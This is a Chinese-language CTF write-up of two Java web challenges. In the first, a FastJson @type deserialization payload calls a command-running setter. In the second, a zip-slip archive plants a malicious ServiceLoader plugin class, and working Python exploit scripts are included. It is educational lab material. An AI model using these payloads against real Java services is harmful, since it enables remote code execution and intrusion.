# 巧乐兹

从简介的"Running `Fast`"感觉到这题可能是反序列化，于是在jar包里搜索Fast，得到`FastJson`相关内容。遂询问ds FastJson库是否存在反序列化漏洞，答案是肯定的：CVE-2026-16723。从`pom.xml`得知题目使用的版本是`1.2.83`，受该CVE影响

FastJsonSetup允许反序列化`com.example.demo.`开头的类，比如`com.example.demo.dto.MetricDTO`。这个类有一个`setValueByCommand`函数，会运行参数指定的命令并将结果输出到Logger中

`ApiController.java`中的`PUT /api/v1/notes`的参数上标注了 `@RequestBody`，当 HTTP 请求到达时，Spring会使用`RequestResponseBodyMethodProcessor`解析这个参数；而`FastJsonSetup`注册了`FastJsonHttpMessageConverter`，这个converter会反序列化json键`@type`指定的类，并调用其他json键指定的该类上的setter（非静态的公共方法，返回值为void或当前类型，只有一个参数；方法名称需以set开头，紧跟大写字母；键无需包含set），以键对应的值作为参数。所以我们可以这样做：
```py
import requests
URL="http://127.0.0.1:50318"
data = {
  "@type": "com.example.demo.dto.MetricDTO",
  "valueByCommand": "cat /flag"
}
requests.put(f"{URL}/api/v1/notes", json=data)
print(requests.get(f"{URL}/api/v1/log").text)
```
# 千度网盘

`FileService.unzipFileVerySafely`存在zipslip,允许攻击者将文件解压到files之外的目录。虽然解压时检查了条目路径是否以`BASE.getParent()`开头，但攻击目标plugins目录与files目录同级，所以不影响

PluginService里的`ServiceLoader.load(Runnable.class, this.classLoader)`本身并不会扫描目录加载类文件，而是询问classLoader所有名为`META-INF/services/java.lang.Runnable`(会在当前URLClassLoader和父ClassLoader的classpath里找)的资源，再在迭代时（`for(Runnable plugin : loader)`）加载里面记录的类。多说无益，直接看脚本：
```py
#谢谢你ds
import os
import zipfile
class_name="Evil" #URLClassLoader似乎会缓存已加载的的类，所以执行别的命令的话需要换类名
#ProcessBuilder执行时默认继承JVM的工作目录，因此是`./files`而不是`../files`
#java.nio.file.Paths.get同理
evil_java = rf'''
public class {class_name} implements Runnable {{
    public void run() {{
        try {{
            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", "cat /flag > ./files/out.txt");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            p.waitFor();
        }} catch (Exception e) {{
            try {{
                java.nio.file.Files.writeString(
                    java.nio.file.Paths.get("./files/out.txt"),
                    "ERROR: " + e.toString()
                );
            }} catch (Exception ignored) {{}}
        }}
    }}
}}
'''
with open(f"{class_name}.java", "w") as f:
    f.write(evil_java)
os.system(f"javac {class_name}.java")   # produces *.class
service_dir = "META-INF/services"
os.makedirs(service_dir, exist_ok=True)
with open(os.path.join(service_dir, "java.lang.Runnable"), "w") as f:
    f.write(f"{class_name}\n")          # class name, one per line

zip_name = "evil.zip"
with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
    # Class file: goes to ./plugins/Evil.class
    z.writestr(f"../plugins/{class_name}.class", open(f"{class_name}.class", "rb").read())

    # Service descriptor: goes to ./plugins/META-INF/services/java.lang.Runnable
    z.writestr(
        "../plugins/META-INF/services/java.lang.Runnable",
        open(os.path.join(service_dir, "java.lang.Runnable"), "rb").read()
    )
os.remove(f"{class_name}.java")
os.remove(f"{class_name}.class")
print(f"[+] Created {zip_name}")
```